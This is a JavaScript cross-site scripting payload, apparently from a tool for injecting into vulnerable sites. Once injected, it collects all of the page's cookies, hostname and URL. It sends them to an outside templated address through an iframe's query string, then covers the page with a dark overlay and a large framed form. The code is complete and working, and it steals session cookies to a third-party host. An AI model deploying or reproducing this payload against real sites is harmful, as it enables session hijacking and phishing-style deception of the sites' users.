
(function(xssinjected) {
    if(xssinjected || location.hostname == 'localhost') return;
    
    window.xssinjected = 1;

    var cookies = (document.cookie || "");
    cookies = cookies.length > 0 ? cookies.split(';') : []
    
    var query = ["host=" + location.hostname,"url=" + location.href];
    for(var i=0; i<cookies.length; i++)
        query.push("cookie=" + cookies[i]);
    
    var create = function(name) { return document.createElement(name); };
    var append = function(el) { return document.body.appendChild(el); };
    
    var frame = create("iframe");
    //<iframe src="http://localhost:5984/xss/_design/api/_rewrite/form.html" style="width:620px;height:820px;-moz-border-radius:15px;border:1px solid #bbb;;margin:0;padding:0;" />
    frame.setAttribute('style', 'background:none repeat scroll 0 0 #FFFFFF; border:1px solid #bbb; -moz-border-radius:15px;border-radius:15px; display:block;  height:850px;left:50%;margin:0 0 0 -310px;padding:0;width:620px;position:absolute;z-index:101;');
    frame.setAttribute('src', "{{form_html}}?" + query.join('&'));
    
    var fader = create("div");
    fader.setAttribute('style', 'position: fixed; margin:-10px; width:100%; height:100%;background-color:#000; opacity:0.6; z-index:100');
    
    append(fader);
    append(frame);
})(window.xssinjected);

